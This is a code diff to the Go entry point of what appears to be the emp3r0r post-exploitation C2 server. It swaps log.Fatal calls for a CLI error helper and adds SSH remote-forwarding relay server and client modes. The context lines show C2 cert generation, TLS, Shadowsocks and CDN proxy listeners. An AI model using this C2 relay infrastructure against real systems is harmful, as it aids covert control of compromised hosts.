@@ -4,9 +4,9 @@
 package main
 
 import (
+	"context"
 	"flag"
 	"fmt"
-	"log"
 	"os"
 	"strings"
 
@@ -44,7 +44,7 @@ func unlock_downloads() bool {
 		if strings.HasSuffix(f.Name(), ".lock") {
 			err = os.Remove(cc.FileGetDir + f.Name())
 			if err != nil {
-				log.Fatalf("Remove %s: %v", f.Name(), err)
+				cc.CliFatalError("Remove %s: %v", f.Name(), err)
 			}
 		}
 	}
@@ -81,13 +81,13 @@ func main() {
 
 	// cleanup or abort
 	if !unlock_downloads() {
-		log.Fatal("CC is already running")
+		cc.CliFatalError("CC is already running")
 	}
 
 	// set up dirs
 	err = cc.DirSetup()
 	if err != nil {
-		log.Fatal(err)
+		cc.CliFatalError("DirSetup: %v", err)
 	}
 
 	// set up magic string
@@ -97,24 +97,50 @@ func main() {
 	config := flag.String("config", cc.EmpConfigFile, "Use this config file to update hardcoded variables")
 	names := flag.String("gencert", "", "Generate C2 server cert with these host names")
 	apiserver := flag.Bool("api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
+	ssh_relay_port := flag.String("relay_server", "", "Act as SSH remote forwarding relay on this port")
+	connect_relay_addr := flag.String("connect_relay", "", "Connect to SSH remote forwarding relay (host:port)")
+	relayed_port := flag.Int("relayed_port", 0, "Relayed port, use with -connect_relay")
 	flag.Parse()
 
 	if *names != "" {
 		hosts := strings.Fields(*names)
 		err := cc.GenC2Certs(hosts)
 		if err != nil {
-			log.Fatalf("GenC2Certs: %v", err)
+			cc.CliFatalError("GenC2Certs: %v", err)
 		}
 		err = cc.InitConfigFile(hosts[0])
 		if err != nil {
-			log.Fatalf("Init %s: %v", cc.EmpConfigFile, err)
+			cc.CliFatalError("Init %s: %v", cc.EmpConfigFile, err)
 		}
 	}
 
 	// read config file
 	err = readJSONConfig(*config)
 	if err != nil {
-		log.Fatalf("Read %s: %v", *config, err)
+		cc.CliFatalError("Read %s: %v", *config, err)
+	} else if *ssh_relay_port != "" {
+		err = tun.SSHRemoteFwdServer(*ssh_relay_port,
+			cc.RuntimeConfig.ShadowsocksPassword,
+			cc.RuntimeConfig.SSHHostKey)
+		if err != nil {
+			cc.CliFatalError("SSHRemoteFwdServer: %v", err)
+		}
+	} else if *connect_relay_addr != "" {
+		if *relayed_port == 0 {
+			cc.CliFatalError("Please specify -relayed_port")
+		}
+		ctx, cancel := context.WithCancel(context.Background())
+		var SSHConnections map[string]context.CancelFunc
+		go func() {
+			err = tun.SSHRemoteFwdClient(*connect_relay_addr,
+				cc.RuntimeConfig.ShadowsocksPassword,
+				cc.RuntimeConfig.SSHHostPubKey,
+				*relayed_port,
+				&SSHConnections, ctx, cancel)
+			if err != nil {
+				cc.CliFatalError("SSHRemoteFwdClient: %v", err)
+			}
+		}()
 	} else {
 		go cc.TLSServer()
 		go cc.ShadowsocksServer()
@@ -125,18 +151,18 @@ func main() {
 		go func() {
 			logFile, err := os.OpenFile("/tmp/ws.log", os.O_CREATE|os.O_RDWR, 0600)
 			if err != nil {
-				log.Fatal(err)
+				cc.CliFatalError("OpenFile: %v", err)
 			}
 			err = cdn2proxy.StartServer(*cdnproxy, "127.0.0.1:"+cc.RuntimeConfig.CCPort, "ws", logFile)
 			if err != nil {
-				log.Fatal(err)
+				cc.CliFatalError("CDN StartServer: %v", err)
 			}
 		}()
 	}
 
 	err = cc.CliBanner()
 	if err != nil {
-		log.Fatal(err)
+		cc.CliFatalError("Banner: %v", err)
 	}
 
 	// use emp3r0r in terminal or from other frontend
